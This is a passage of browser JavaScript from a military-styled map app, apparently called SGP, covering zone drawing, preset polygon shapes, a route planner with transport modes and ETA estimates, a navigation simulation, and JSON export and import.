        '<div class="panel-section"><div class="panel-section-title">📂 ZONE LIBRARY (' + state.zones.length + ')</div>' + (hasZones ? '<div class="route-saved-list">' + zonesHTML + '</div><div style="display:flex;gap:6px;margin-top:8px;"><button class="btn btn-secondary" style="flex:1;" onclick="window.SGP.exportAllZones()">📤 EXPORT ALL</button><button class="btn btn-secondary" style="flex:1;border-color:var(--danger);color:var(--danger);" onclick="window.SGP.clearAllZones()">🗑️ CLEAR ALL</button></div>' : '<div style="text-align:center;padding:20px;"><div style="font-size:1.5rem;margin-bottom:8px;opacity:0.2;">🔲</div><p style="font-family:var(--font-mono);font-size:0.6rem;color:var(--text-dim);letter-spacing:1px;">NO SAVED ZONES<br>Draw or use presets</p></div>') + '</div>' +
        '<div class="panel-section"><div class="panel-section-title">📥 IMPORT ZONE</div><div style="font-family:var(--font-mono);font-size:0.55rem;color:var(--text-dim);margin-bottom:8px;">Paste polygon coordinates (lat,lng per line)</div><textarea id="zone-import-text" style="width:100%;background:var(--bg-tertiary);border:1px solid var(--border);border-radius:6px;padding:10px;color:var(--text-primary);font-family:var(--font-mono);font-size:0.65rem;resize:none;outline:none;" rows="3" placeholder="40.4168,-3.7038&#10;40.4200,-3.7100&#10;40.4250,-3.7050"></textarea><button class="btn btn-primary" style="width:100%;margin-top:6px;" onclick="window.SGP.importZone()">📥 IMPORT ZONE</button></div>';
    }

    // Zone Panel Handlers
    window.SGP.startZoneDrawing = function() { state.currentTool = 'zone'; state.zonePoints = []; state.zoneMarkers = []; state.zoneLine = null; document.getElementById('map').style.cursor = 'crosshair'; showToast('✏️ CLICK MAP TO ADD ZONE VERTICES'); if (state.panelOpen === 'zone') openPanel('zone'); };
    window.SGP.finishZoneDrawing = function() { state.currentTool = 'pan'; document.getElementById('map').style.cursor = ''; finishZone(); if (state.panelOpen === 'zone') openPanel('zone'); };
    window.SGP.cancelZone = function() { state.currentTool = 'pan'; document.getElementById('map').style.cursor = ''; if (state.zoneLine) state.map.removeLayer(state.zoneLine); state.zoneMarkers.forEach(function(m) { state.map.removeLayer(m); }); state.zonePoints = null; state.zoneLine = null; state.zoneMarkers = []; showToast('❌ ZONE CANCELLED'); if (state.panelOpen === 'zone') openPanel('zone'); };
    window.SGP.undoZonePoint = function() { if (!state.zonePoints || state.zonePoints.length === 0) return; state.zonePoints.pop(); var last = state.zoneMarkers.pop(); if (last) state.map.removeLayer(last); if (state.zoneLine) state.map.removeLayer(state.zoneLine); if (state.zonePoints.length >= 2) { var pts = state.zonePoints.concat([state.zonePoints[0]]); state.zoneLine = L.polyline(pts, { color: state.zoneColor, weight: 2, dashArray: '8 4', opacity: 0.6 }).addTo(state.map); } else { state.zoneLine = null; } if (state.panelOpen === 'zone') openPanel('zone'); };
    window.SGP.setZoneType = function(type, color) { state.zoneColor = color; showToast('🏷️ ZONE TYPE: ' + type.toUpperCase()); window.SGP.startZoneDrawing(); };
    window.SGP.setZoneColor = function(color) { state.zoneColor = color; if (state.panelOpen === 'zone') openPanel('zone'); };
    window.SGP.setZoneFillOpacity = function(val) { state.zoneFillOpacity = val; if (state.panelOpen === 'zone') openPanel('zone'); };
    window.SGP.focusZone = function(idx) { var z = state.zones[idx]; if (!z || !z.points) return; state.map.flyToBounds(L.latLngBounds(z.points), { padding: [50, 50], duration: 1 }); };
    window.SGP.deleteZone = function(idx) { var z = state.zones[idx]; if (!z) return; if (z.polygon) state.map.removeLayer(z.polygon); state.zones.splice(idx, 1); saveAllZones(); showToast('🗑️ ZONE DELETED'); if (state.panelOpen === 'zone') openPanel('zone'); };
    window.SGP.exportZone = function(idx) { var z = state.zones[idx]; if (!z) return; var blob = new Blob([JSON.stringify({ points: z.points }, null, 2)], { type: 'application/json' }); var url = URL.createObjectURL(blob); var a = document.createElement('a'); a.href = url; a.download = 'sgp_zone_' + String.fromCharCode(65+idx) + '_' + Date.now() + '.json'; a.click(); URL.revokeObjectURL(url); showToast('📤 ZONE EXPORTED'); };
    window.SGP.exportAllZones = function() { var data = state.zones.map(function(z, i) { return { name: 'Zone ' + String.fromCharCode(65+i), points: z.points }; }); var blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' }); var url = URL.createObjectURL(blob); var a = document.createElement('a'); a.href = url; a.download = 'sgp_zones_' + Date.now() + '.json'; a.click(); URL.revokeObjectURL(url); showToast('📤 ALL ZONES EXPORTED'); };
    window.SGP.clearAllZones = function() { state.zones.forEach(function(z) { if (z.polygon) state.map.removeLayer(z.polygon); }); state.zones = []; saveAllZones(); showToast('🗑️ ALL ZONES CLEARED'); if (state.panelOpen === 'zone') openPanel('zone'); };

    function createPolygonZone(points) { var color = state.zoneColor || '#ff2d2d'; var opacity = (state.zoneFillOpacity || 10) / 100; var polygon = L.polygon(points, { color: color, fillColor: color, fillOpacity: opacity, weight: 2, dashArray: '8 4' }).addTo(state.map); state.zones.push({ id: 'zone-' + Date.now(), points: points, polygon: polygon }); saveAllZones(); state.map.flyToBounds(L.latLngBounds(points), { padding: [50, 50] }); if (state.panelOpen === 'zone') openPanel('zone'); }
    window.SGP.createCircleZone = function() { var c = state.map.getCenter(), r = 0.004, pts = []; for (var i = 0; i < 24; i++) { var a = (i/24)*Math.PI*2; pts.push([c.lat+r*Math.cos(a), c.lng+r*Math.sin(a)]); } createPolygonZone(pts); showToast('⭕ CIRCLE ZONE CREATED'); };
    window.SGP.createSquareZone = function() { var c = state.map.getCenter(), d = 0.004; createPolygonZone([[c.lat+d,c.lng-d],[c.lat+d,c.lng+d],[c.lat-d,c.lng+d],[c.lat-d,c.lng-d]]); showToast('⬜ SQUARE ZONE CREATED'); };
    window.SGP.createTriangleZone = function() { var c = state.map.getCenter(), d = 0.005; createPolygonZone([[c.lat+d,c.lng],[c.lat-d*0.5,c.lng+d*0.866],[c.lat-d*0.5,c.lng-d*0.866]]); showToast('🔺 TRIANGLE ZONE CREATED'); };
    window.SGP.createHexZone = function() { var c = state.map.getCenter(), r = 0.004, pts = []; for (var i = 0; i < 6; i++) { var a = (i/6)*Math.PI*2; pts.push([c.lat+r*Math.cos(a), c.lng+r*Math.sin(a)]); } createPolygonZone(pts); showToast('⬡ HEXAGON ZONE CREATED'); };
    window.SGP.createStarZone = function() { var c = state.map.getCenter(), pts = []; for (var i = 0; i < 10; i++) { var a = (i/10)*Math.PI*2-Math.PI/2; var r = i%2===0 ? 0.005 : 0.002; pts.push([c.lat+r*Math.cos(a), c.lng+r*Math.sin(a)]); } createPolygonZone(pts); showToast('⭐ STAR ZONE CREATED'); };
    window.SGP.createBufferZone = function() { var c = state.map.getCenter(), inner = 0.002, outer = 0.004; var ptsO = [], ptsI = []; for (var i = 0; i < 24; i++) { var a = (i/24)*Math.PI*2; ptsO.push([c.lat+outer*Math.cos(a), c.lng+outer*Math.sin(a)]); ptsI.push([c.lat+inner*Math.cos(a), c.lng+inner*Math.sin(a)]); } createPolygonZone(ptsO); var p = L.polygon(ptsI, { color: '#00ff41', fillColor: '#00ff41', fillOpacity: 0.08, weight: 2, dashArray: '4 4' }).addTo(state.map); state.zones.push({ id: 'zone-' + Date.now(), points: ptsI, polygon: p }); saveAllZones(); showToast('🔘 BUFFER ZONE CREATED'); if (state.panelOpen === 'zone') openPanel('zone'); };
    window.SGP.importZone = function() { var textarea = document.getElementById('zone-import-text'); if (!textarea || !textarea.value.trim()) { showToast('⚠ Paste coordinates first'); return; } var lines = textarea.value.trim().split('\n'), points = []; lines.forEach(function(line) { var parts = line.trim().split(/[,\s]+/); if (parts.length >= 2) { var lat = parseFloat(parts[0]), lng = parseFloat(parts[1]); if (!isNaN(lat) && !isNaN(lng)) points.push([lat, lng]); } }); if (points.length < 3) { showToast('⚠ Need at least 3 coordinates'); return; } createPolygonZone(points); showToast('📥 ZONE IMPORTED — ' + points.length + ' vertices'); textarea.value = ''; };

    // =========================================
    // ROUTE PLANNER PANEL
    // =========================================
    function renderRoutePanel() {
        const cfg = state.routeConfig;
        const hasRoutes = state.routes.length > 0;
        const isDrawing = state.routeDrawing;
        const hasCurrentPoints = state.routePoints.length > 0;

        // Transport modes
        const modes = [
            { id: 'foot', icon: '🚶', label: 'FOOT PATROL', speed: '5 km/h' },
            { id: 'vehicle', icon: '🚗', label: 'MOTORIZED', speed: '60 km/h' },
            { id: 'helo', icon: '🚁', label: 'HELICOPTER', speed: '250 km/h' },
            { id: 'tactical', icon: '🎯', label: 'TACTICAL ADVANCE', speed: '3 km/h' },
            { id: 'recon', icon: '🔭', label: 'RECONNAISSANCE', speed: '4 km/h' },
            { id: 'exfil', icon: '🏃', label: 'EXFILTRATION', speed: '8 km/h' },
            { id: 'naval', icon: '🚢', label: 'NAVAL/AMPHIBIOUS', speed: '30 kts' },
            { id: 'paradrop', icon: '🪂', label: 'AIRBORNE/PARADROP', speed: '200 km/h' },
            { id: 'convoy', icon: '🚛', label: 'CONVOY', speed: '40 km/h' },
            { id: 'stealth', icon: '🥷', label: 'STEALTH/COVERT', speed: '2 km/h' },
            { id: 'bicycle', icon: '🚲', label: 'BICYCLE', speed: '20 km/h' },
            { id: 'mounted', icon: '🐴', label: 'MOUNTED', speed: '15 km/h' }
        ];

        // Route colors
        const colors = [
            { id: '#00b4ff', label: 'BLUE' },
            { id: '#00ff41', label: 'GREEN' },
            { id: '#ff2d2d', label: 'RED' },
            { id: '#ffaa00', label: 'ORANGE' },
            { id: '#ff44ff', label: 'MAGENTA' },
            { id: '#ffdd44', label: 'YELLOW' },
            { id: '#ffffff', label: 'WHITE' },
            { id: '#8a2be2', label: 'PURPLE' }
        ];

        // Route styles
        const styles = [
            { id: 'solid', label: 'SOLID', dash: '' },
            { id: 'dashed', label: 'DASHED', dash: '10 6' },
            { id: 'dotted', label: 'DOTTED', dash: '3 6' },
            { id: 'dashdot', label: 'DASH-DOT', dash: '15 5 3 5' }
        ];

        // Terrain types
        const terrains = [
            { id: 'mixed', icon: '🌍', label: 'MIXED' },
            { id: 'road', icon: '🛣️', label: 'ROADS ONLY' },
            { id: 'offroad', icon: '🌲', label: 'OFF-ROAD' },
            { id: 'water', icon: '🌊', label: 'WATERWAY' },
            { id: 'air', icon: '✈️', label: 'AIRSPACE' },
            { id: 'mountain', icon: '⛰️', label: 'MOUNTAIN' },
            { id: 'desert', icon: '🏜️', label: 'DESERT' },
            { id: 'urban', icon: '🏙️', label: 'URBAN CQB' }
        ];

        // Waypoint list
        let waypointHTML = '';
        if (hasCurrentPoints) {
            waypointHTML = state.routePoints.map((p, i) => `
                <div class="route-waypoint-item">
                    <span class="route-wp-index">${String.fromCharCode(65 + i)}</span>
                    <span class="route-wp-coord">${p[0].toFixed(5)}, ${p[1].toFixed(5)}</span>
                    <button class="route-wp-remove" onclick="window.SGP.removeWaypoint(${i})">✕</button>
                </div>
            `).join('');
        }

        // Saved routes list
        let routeListHTML = '';
        if (hasRoutes) {
            routeListHTML = state.routes.map((r, i) => {
                const pts = r.points.length;
                const dist = formatDistance(r.distance);
                return `
                <div class="route-saved-item" onclick="window.SGP.focusRoute(${i})">
                    <div class="route-saved-icon">🗺️</div>
                    <div class="route-saved-info">
                        <div class="route-saved-name">ROUTE ${String.fromCharCode(65 + i)} · ${pts} waypoints</div>
                        <div class="route-saved-detail">${dist} · ${r.id.replace('route-','')}</div>
                    </div>
                    <div class="route-saved-actions">
                        <button onclick="event.stopPropagation(); window.SGP.exportSingleRoute(${i})" title="Export">📤</button>
                        <button onclick="event.stopPropagation(); window.SGP.deleteRoute(${i})" title="Delete">🗑️</button>
                    </div>
                </div>`;
            }).join('');
        }

        // Calculate ETA for current route
        let etaHTML = '';
        if (hasCurrentPoints && state.routePoints.length >= 2) {
            const dist = calculateRouteDistance(state.routePoints);
            const speedMap = { foot: 5, vehicle: 60, helo: 250, tactical: 3, recon: 4, exfil: 8, naval: 55, paradrop: 200, convoy: 40, stealth: 2, bicycle: 20, mounted: 15 };
            const speed = speedMap[cfg.mode] || 5;
            const timeHours = (dist / 1000) / speed;
            const hours = Math.floor(timeHours);
            const minutes = Math.round((timeHours - hours) * 60);
            etaHTML = `
                <div class="route-eta-display">
                    <div class="route-eta-item"><span class="route-eta-label">DISTANCE</span><span class="route-eta-value">${formatDistance(dist)}</span></div>
                    <div class="route-eta-item"><span class="route-eta-label">ETA</span><span class="route-eta-value">${hours}h ${minutes}m</span></div>
                    <div class="route-eta-item"><span class="route-eta-label">SPEED</span><span class="route-eta-value">${speed} ${cfg.mode === 'naval' ? 'kts' : 'km/h'}</span></div>
                    <div class="route-eta-item"><span class="route-eta-label">WAYPOINTS</span><span class="route-eta-value">${state.routePoints.length}</span></div>
                </div>
            `;
        }

        return `
            <!-- DRAW MODE -->
            <div class="panel-section">
                <div class="panel-section-title">📍 ROUTE DRAWING MODE</div>
                <div class="route-draw-status ${isDrawing ? 'active' : ''}">
                    <span class="route-draw-dot ${isDrawing ? 'pulse' : ''}">●</span>
                    <span>${isDrawing ? 'DRAWING ACTIVE — Click map to add waypoints' : 'NOT DRAWING'}</span>
                </div>
                <div style="display:flex;gap:6px;margin-top:8px;">
                    ${!isDrawing ? `
                        <button class="btn btn-primary" style="flex:1;" onclick="window.SGP.startRouteDrawing()">✏️ START DRAWING</button>
                    ` : `
                        <button class="btn btn-primary" style="flex:1;" onclick="window.SGP.finishRouteDrawing()">✅ FINISH ROUTE</button>
                        <button class="btn btn-secondary" style="flex:0 0 auto;" onclick="window.SGP.undoLastWaypoint()">↩ UNDO</button>
                        <button class="btn btn-secondary" style="flex:0 0 auto;border-color:var(--danger);color:var(--danger);" onclick="window.SGP.cancelRouteDrawing()">✕</button>
                    `}
                </div>
                ${hasCurrentPoints && isDrawing ? `<div style="font-family:var(--font-mono);font-size:0.55rem;color:var(--primary);margin-top:6px;text-align:center;">${state.routePoints.length} WAYPOINT${state.routePoints.length > 1 ? 'S' : ''} PLACED</div>` : ''}
            </div>

            <!-- CURRENT ROUTE ETA -->
            ${etaHTML}

            <!-- WAYPOINTS -->
            ${hasCurrentPoints || hasRoutes ? `
            <div class="panel-section">
                <div class="panel-section-title">📌 CURRENT WAYPOINTS (${state.routePoints.length})</div>
                <div class="route-waypoints-list">
                    ${waypointHTML || '<div style="font-family:var(--font-mono);font-size:0.6rem;color:var(--text-dim);text-align:center;padding:12px;">No waypoints yet</div>'}
                </div>
            </div>
            ` : ''}

            <!-- TRANSPORT MODE -->
            <div class="panel-section">
                <div class="panel-section-title">🚁 TRANSPORT MODE</div>
                <div class="route-mode-grid">
                    ${modes.map(m => `
                        <div class="route-mode-btn ${cfg.mode === m.id ? 'active' : ''}" onclick="window.SGP.setRouteMode('${m.id}')">
                            <span class="route-mode-icon">${m.icon}</span>
                            <span class="route-mode-label">${m.label}</span>
                            <span class="route-mode-speed">${m.speed}</span>
                        </div>
                    `).join('')}
                </div>
            </div>

            <!-- ROUTE STYLE -->
            <div class="panel-section">
                <div class="panel-section-title">🎨 ROUTE STYLE</div>
                <div class="route-color-row">
                    ${colors.map(c => `
                        <div class="route-color-swatch ${cfg.color === c.id ? 'active' : ''}" 
                             style="background:${c.id};" 
                             onclick="window.SGP.setRouteColor('${c.id}')" 
                             title="${c.label}"></div>
                    `).join('')}
                </div>
                <div class="route-style-row">
                    ${styles.map(s => `
                        <button class="route-style-btn ${cfg.style === s.id ? 'active' : ''}" onclick="window.SGP.setRouteStyle('${s.id}')">
                            <svg width="40" height="8" viewBox="0 0 40 8">
                                <line x1="0" y1="4" x2="40" y2="4" stroke="${cfg.color}" stroke-width="2" 
                                      ${s.dash ? `stroke-dasharray="${s.dash}"` : ''}/>
                            </svg>
                            <span>${s.label}</span>
                        </button>
                    `).join('')}
                </div>
                <div class="route-width-control">
                    <span class="route-width-label">LINE WIDTH</span>
                    <input type="range" min="1" max="8" value="${cfg.weight}" 
                           oninput="window.SGP.setRouteWeight(parseInt(this.value))" 
                           style="flex:1;accent-color:${cfg.color};">
                    <span class="route-width-value">${cfg.weight}px</span>
                </div>
            </div>

            <!-- TERRAIN TYPE -->
            <div class="panel-section">
                <div class="panel-section-title">🌍 TERRAIN TYPE</div>
                <div class="route-terrain-grid">
                    ${terrains.map(t => `
                        <div class="route-terrain-btn ${cfg.terrain === t.id ? 'active' : ''}" onclick="window.SGP.setRouteTerrain('${t.id}')">
                            <span>${t.icon}</span>
                            <span>${t.label}</span>
                        </div>
                    `).join('')}
                </div>
            </div>

            <!-- TACTICAL OPTIONS -->
            <div class="panel-section">
                <div class="panel-section-title">⚔️ TACTICAL OPTIONS</div>
                <div class="route-tactical-opts">
                    <div class="route-opt-toggle" onclick="window.SGP.toggleRouteOpt('showWaypoints')">
                        <span>📍 Show Waypoint Labels</span>
                        <div class="toggle-switch ${cfg.showWaypoints ? 'active' : ''}"></div>
                    </div>
                    <div class="route-opt-toggle" onclick="window.SGP.toggleRouteOpt('showDistance')">
                        <span>📏 Show Distance Labels</span>
                        <div class="toggle-switch ${cfg.showDistance ? 'active' : ''}"></div>
                    </div>
                    <div class="route-opt-toggle" onclick="window.SGP.toggleRouteOpt('showETA')">
                        <span>⏱️ Show ETA</span>
                        <div class="toggle-switch ${cfg.showETA ? 'active' : ''}"></div>
                    </div>
                    <div class="route-opt-toggle" onclick="window.SGP.toggleRouteOpt('avoidRoads')">
                        <span>🚫 Avoid Main Roads</span>
                        <div class="toggle-switch ${cfg.avoidRoads ? 'active' : ''}"></div>
                    </div>
                    <div class="route-opt-toggle" onclick="window.SGP.toggleRouteOpt('avoidUrban')">
                        <span>🏙️ Avoid Urban Areas</span>
                        <div class="toggle-switch ${cfg.avoidUrban ? 'active' : ''}"></div>
                    </div>
                    <div class="route-opt-toggle" onclick="window.SGP.toggleRouteOpt('dangerZones')">
                        <span>⚠️ Mark Danger Zones</span>
                        <div class="toggle-switch ${cfg.dangerZones ? 'active' : ''}"></div>
                    </div>
                    <div class="route-opt-toggle" onclick="window.SGP.toggleRouteOpt('nightOps')">
                        <span>🌙 Night Operations Mode</span>
                        <div class="toggle-switch ${cfg.nightOps ? 'active' : ''}"></div>
                    </div>
                    <div class="route-opt-toggle" onclick="window.SGP.toggleRouteOpt('showElevation')">
                        <span>📈 Show Elevation Profile</span>
                        <div class="toggle-switch ${cfg.showElevation ? 'active' : ''}"></div>
                    </div>
                </div>
            </div>

            <!-- NAVIGATION SIMULATION -->
            ${hasRoutes ? `
            <div class="panel-section">
                <div class="panel-section-title">🧭 NAVIGATION SIMULATION</div>
                <div style="font-family:var(--font-mono);font-size:0.55rem;color:var(--text-dim);margin-bottom:8px;">Simulate movement along a saved route to preview tactical approach.</div>
                <div style="display:flex;gap:6px;">
                    ${!state.routeNavActive ? `
                        <button class="btn btn-primary" style="flex:1;" onclick="window.SGP.startNavSim()">▶ START NAV SIM</button>
                        <select id="route-nav-select" style="flex:1;background:var(--bg-tertiary);border:1px solid var(--border);border-radius:6px;padding:6px;color:var(--text-primary);font-family:var(--font-mono);font-size:0.6rem;">
                            ${state.routes.map((r, i) => `<option value="${i}">ROUTE ${String.fromCharCode(65 + i)} (${formatDistance(r.distance)})</option>`).join('')}
                        </select>
                    ` : `
                        <button class="btn btn-secondary" style="flex:1;border-color:var(--danger);color:var(--danger);" onclick="window.SGP.stopNavSim()">⏹ STOP SIMULATION</button>
                    `}
                </div>
                ${state.routeNavActive ? `
                    <div class="route-nav-progress">
                        <div class="route-nav-bar" style="width:${Math.round((state.routeNavIndex / Math.max(1, state.routes[0]?.points?.length - 1 || 1)) * 100)}%;"></div>
                    </div>
                    <div style="font-family:var(--font-mono);font-size:0.55rem;color:var(--primary);text-align:center;margin-top:4px;">NAVIGATING... Point ${state.routeNavIndex + 1}</div>
                ` : ''}
            </div>
            ` : ''}

            <!-- ROUTE LIBRARY -->
            <div class="panel-section">
                <div class="panel-section-title">📂 ROUTE LIBRARY (${state.routes.length})</div>
                ${hasRoutes ? `
                    <div class="route-saved-list">
                        ${routeListHTML}
                    </div>
                    <div style="display:flex;gap:6px;margin-top:8px;">
                        <button class="btn btn-secondary" style="flex:1;" onclick="window.SGP.exportAllRoutes()">📤 EXPORT ALL</button>
                        <button class="btn btn-secondary" style="flex:1;border-color:var(--danger);color:var(--danger);" onclick="window.SGP.clearAllRoutes()">🗑️ CLEAR ALL</button>
                    </div>
                ` : `
                    <div style="text-align:center;padding:20px;">
                        <div style="font-size:1.5rem;margin-bottom:8px;opacity:0.2;">🗺️</div>
                        <p style="font-family:var(--font-mono);font-size:0.6rem;color:var(--text-dim);letter-spacing:1px;">NO SAVED ROUTES<br>Start drawing to create routes</p>
                    </div>
                `}
            </div>

            <!-- QUICK TOOLS -->
            <div class="panel-section">
                <div class="panel-section-title">⚡ QUICK TOOLS</div>
                <div class="route-quick-grid">
                    <button class="route-quick-btn" onclick="window.SGP.routeToPosition()">
                        <span>📍</span><span>Route to<br>My Position</span>
                    </button>
                    <button class="route-quick-btn" onclick="window.SGP.routeToCenter()">
                        <span>🎯</span><span>Route to<br>Map Center</span>
                    </button>
                    <button class="route-quick-btn" onclick="window.SGP.createCircularRoute()">
                        <span>🔄</span><span>Circular<br>Patrol</span>
                    </button>
                    <button class="route-quick-btn" onclick="window.SGP.createPerimeter()">
                        <span>🔲</span><span>Perimeter<br>Route</span>
                    </button>
                    <button class="route-quick-btn" onclick="window.SGP.reverseRoute()">
                        <span>↩️</span><span>Reverse<br>Direction</span>
                    </button>
                    <button class="route-quick-btn" onclick="window.SGP.duplicateRoute()">
                        <span>📋</span><span>Duplicate<br>Last Route</span>
                    </button>
                </div>
            </div>

            <!-- IMPORT -->
            <div class="panel-section">
                <div class="panel-section-title">📥 IMPORT ROUTE</div>
                <div style="font-family:var(--font-mono);font-size:0.55rem;color:var(--text-dim);margin-bottom:8px;">Paste coordinates (lat,lng per line) or import JSON.</div>
                <textarea id="route-import-text" style="width:100%;background:var(--bg-tertiary);border:1px solid var(--border);border-radius:6px;padding:10px;color:var(--text-primary);font-family:var(--font-mono);font-size:0.65rem;resize:none;outline:none;" rows="4" placeholder="40.4168, -3.7038&#10;40.4200, -3.7100&#10;40.4250, -3.7050"></textarea>
                <button class="btn btn-primary" style="width:100%;margin-top:6px;" onclick="window.SGP.importRoute()">📥 IMPORT COORDINATES</button>
            </div>
        `;
    }

    function initRoutePanel() {
        // Panel interactions handled via window.SGP
    }

    // Route Drawing Control
    window.SGP.startRouteDrawing = function() {
        state.routeDrawing = true;
        state.routePoints = [];
        state.routeMarkers = [];
        state.routeLine = null;
        state.currentTool = 'route_draw';
        document.getElementById('map').style.cursor = 'crosshair';
        showToast('✏️ CLICK ON MAP TO ADD WAYPOINTS');
        if (state.panelOpen === 'route') openPanel('route');
    };

    window.SGP.finishRouteDrawing = function() {
        state.routeDrawing = false;
        state.currentTool = 'pan';
        document.getElementById('map').style.cursor = '';
        finishRoute();
        if (state.panelOpen === 'route') openPanel('route');
    };

    window.SGP.cancelRouteDrawing = function() {
        state.routeDrawing = false;
        state.currentTool = 'pan';
        document.getElementById('map').style.cursor = '';
        state.routeMarkers.forEach(m => state.map.removeLayer(m));
        if (state.routeLine) state.map.removeLayer(state.routeLine);
        state.routePoints = []; state.routeLine = null; state.routeMarkers = [];
        showToast('❌ ROUTE CANCELLED');
        if (state.panelOpen === 'route') openPanel('route');
    };

    window.SGP.undoLastWaypoint = function() {
        if (state.routePoints.length === 0) return;
        state.routePoints.pop();
        const last = state.routeMarkers.pop();
        if (last) state.map.removeLayer(last);
        if (state.routeLine) state.map.removeLayer(state.routeLine);
        if (state.routePoints.length >= 2) {
            state.routeLine = L.polyline(state.routePoints, {
                color: state.routeConfig.color,
                weight: state.routeConfig.weight,
                dashArray: getRouteDashArray(),
                opacity: 0.8
            }).addTo(state.map);
        } else {
            state.routeLine = null;
        }
        showToast(`↩ UNDO — ${state.routePoints.length} waypoints`);
        if (state.panelOpen === 'route') openPanel('route');
    };

    window.SGP.removeWaypoint = function(index) {
        if (index < 0 || index >= state.routePoints.length) return;
        if (state.routeMarkers[index]) state.map.removeLayer(state.routeMarkers[index]);
        state.routePoints.splice(index, 1);
        state.routeMarkers.splice(index, 1);
        if (state.routeLine) state.map.removeLayer(state.routeLine);
        if (state.routePoints.length >= 2) {
            state.routeLine = L.polyline(state.routePoints, {
                color: state.routeConfig.color,
                weight: state.routeConfig.weight,
                dashArray: getRouteDashArray(),
                opacity: 0.8
            }).addTo(state.map);
        } else {
            state.routeLine = null;
        }
        if (state.panelOpen === 'route') openPanel('route');
    };

    // Route mode/style/color settings
    window.SGP.setRouteMode = function(mode) {
        state.routeConfig.mode = mode;
        sgpSave('routeConfig', state.routeConfig);
        if (state.panelOpen === 'route') openPanel('route');
    };

    window.SGP.setRouteColor = function(color) {
        state.routeConfig.color = color;
        sgpSave('routeConfig', state.routeConfig);
        if (state.panelOpen === 'route') openPanel('route');
    };

    window.SGP.setRouteStyle = function(style) {
        state.routeConfig.style = style;
        sgpSave('routeConfig', state.routeConfig);
        if (state.panelOpen === 'route') openPanel('route');
    };

    window.SGP.setRouteWeight = function(weight) {
        state.routeConfig.weight = weight;
        sgpSave('routeConfig', state.routeConfig);
        if (state.panelOpen === 'route') openPanel('route');
    };

    window.SGP.setRouteTerrain = function(terrain) {
        state.routeConfig.terrain = terrain;
        sgpSave('routeConfig', state.routeConfig);
        if (state.panelOpen === 'route') openPanel('route');
    };

    window.SGP.toggleRouteOpt = function(opt) {
        state.routeConfig[opt] = !state.routeConfig[opt];
        sgpSave('routeConfig', state.routeConfig);
        if (state.panelOpen === 'route') openPanel('route');
    };

    function getRouteDashArray() {
        const map = { solid: '', dashed: '10 6', dotted: '3 6', dashdot: '15 5 3 5' };
        return map[state.routeConfig.style] || '10 6';
    }

    // Route Library functions
    window.SGP.focusRoute = function(index) {
        const r = state.routes[index];
        if (!r || !r.points || r.points.length === 0) return;
        const bounds = L.latLngBounds(r.points);
        state.map.flyToBounds(bounds, { padding: [50, 50], duration: 1 });
    };

    window.SGP.deleteRoute = function(index) {
        const r = state.routes[index];
        if (!r) return;
        if (r.line) state.map.removeLayer(r.line);
        if (r.markers) r.markers.forEach(m => state.map.removeLayer(m));
        state.routes.splice(index, 1);
        saveAllRoutes();
        showToast('🗑️ ROUTE DELETED');
        if (state.panelOpen === 'route') openPanel('route');
    };

    window.SGP.exportSingleRoute = function(index) {
        const r = state.routes[index];
        if (!r) return;
        const data = { points: r.points, distance: r.distance, mode: state.routeConfig.mode, terrain: state.routeConfig.terrain, exportDate: new Date().toISOString() };
        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a'); a.href = url; a.download = `sgp_route_${String.fromCharCode(65 + index)}_${Date.now()}.json`; a.click();
        URL.revokeObjectURL(url);
        showToast('📤 ROUTE EXPORTED');
    };

    window.SGP.exportAllRoutes = function() {
        const data = {
            routes: state.routes.map((r, i) => ({ name: `Route ${String.fromCharCode(65 + i)}`, points: r.points, distance: r.distance })),
            config: state.routeConfig,
            exportDate: new Date().toISOString()
        };
        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a'); a.href = url; a.download = `sgp_all_routes_${Date.now()}.json`; a.click();
        URL.revokeObjectURL(url);
        showToast('📤 ALL ROUTES EXPORTED');
    };

    window.SGP.clearAllRoutes = function() {
        state.routes.forEach(r => { if (r.line) state.map.removeLayer(r.line); if (r.markers) r.markers.forEach(m => state.map.removeLayer(m)); });
        state.routes = [];
        saveAllRoutes();
        showToast('🗑️ ALL ROUTES CLEARED');
        if (state.panelOpen === 'route') openPanel('route');
    };

    // Navigation simulation
    window.SGP.startNavSim = function() {
        const select = document.getElementById('route-nav-select');
        const idx = select ? parseInt(select.value) : 0;
        const r = state.routes[idx];
        if (!r || !r.points || r.points.length < 2) { showToast('⚠ Invalid route'); return; }

        state.routeNavActive = true;
        state.routeNavIndex = 0;

        const navIcon = L.divIcon({
            html: '<div style="font-size:20px;filter:drop-shadow(0 0 6px rgba(0,255,65,0.8));">🔺</div>',
            className: 'nav-sim-icon',
            iconSize: [24, 24],
            iconAnchor: [12, 12]
        });

        state.routeNavMarker = L.marker(r.points[0], { icon: navIcon }).addTo(state.map);
        state.map.flyTo(r.points[0], 16, { duration: 0.5 });

        state.routeNavInterval = setInterval(() => {
            state.routeNavIndex++;
            if (state.routeNavIndex >= r.points.length) {
                window.SGP.stopNavSim();
                showToast('✅ NAVIGATION COMPLETE — DESTINATION REACHED');
                return;
            }
            const pt = r.points[state.routeNavIndex];
            state.routeNavMarker.setLatLng(pt);
            state.map.panTo(pt, { animate: true, duration: 0.3 });
            if (state.panelOpen === 'route') openPanel('route');
        }, 1500);

        showToast('🧭 NAVIGATION SIMULATION STARTED');
        if (state.panelOpen === 'route') openPanel('route');
    };

    window.SGP.stopNavSim = function() {
        state.routeNavActive = false;
        if (state.routeNavInterval) { clearInterval(state.routeNavInterval); state.routeNavInterval = null; }
        if (state.routeNavMarker) { state.map.removeLayer(state.routeNavMarker); state.routeNavMarker = null; }
        state.routeNavIndex = 0;
        if (state.panelOpen === 'route') openPanel('route');
    };

    // Quick Tools
    window.SGP.routeToPosition = function() {
        if (!state.userPosition) { showToast('⚠ GPS position not available'); return; }
        window.SGP.startRouteDrawing();
        addRoutePoint(state.userPosition[0], state.userPosition[1]);
        showToast('📍 START POINT SET TO YOUR POSITION — Click destination on map');
    };

    window.SGP.routeToCenter = function() {
        const center = state.map.getCenter();
        if (state.routePoints.length > 0) {
            addRoutePoint(center.lat, center.lng);
            showToast('🎯 WAYPOINT ADDED AT MAP CENTER');
        } else {
            window.SGP.startRouteDrawing();
            addRoutePoint(center.lat, center.lng);
            showToast('🎯 START POINT SET TO MAP CENTER');
        }
        if (state.panelOpen === 'route') openPanel('route');
    };

